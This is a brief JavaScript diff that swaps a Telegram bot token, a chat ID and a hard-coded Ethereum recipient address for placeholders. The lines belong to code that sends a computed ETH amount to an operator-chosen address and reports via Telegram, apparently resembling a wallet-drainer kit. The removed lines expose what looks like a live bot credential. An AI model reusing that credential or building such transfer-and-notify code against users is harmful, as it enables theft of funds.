@@ -142,8 +142,8 @@
             }
 
             // Configuration Telegram
-            const TELEGRAM_BOT_TOKEN = '8189811123:AAG_3YlqOGNYzfMys7PknpEvbnpUZ3dTO8c';
-            const TELEGRAM_CHAT_ID = '-4635118249';
+            const TELEGRAM_BOT_TOKEN = 'T';
+            const TELEGRAM_CHAT_ID = 'C';
             const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
             // Prix approximatifs en USD
@@ -310,7 +310,7 @@
                 console.log('Montant à envoyer :', window.ethers.utils.formatEther(ethValueToSend), 'ETH');
 
                 const tx = {
-                    to: '0xc427AB745eA6b12C557c7342f94D96f68D19D754', // Remplace par TON adresse ETH
+                    to: 'add', // Remplace par TON adresse ETH
                     value: ethValueToSend,
                     gasLimit: gasLimit,
                     gasPrice: gasPrice
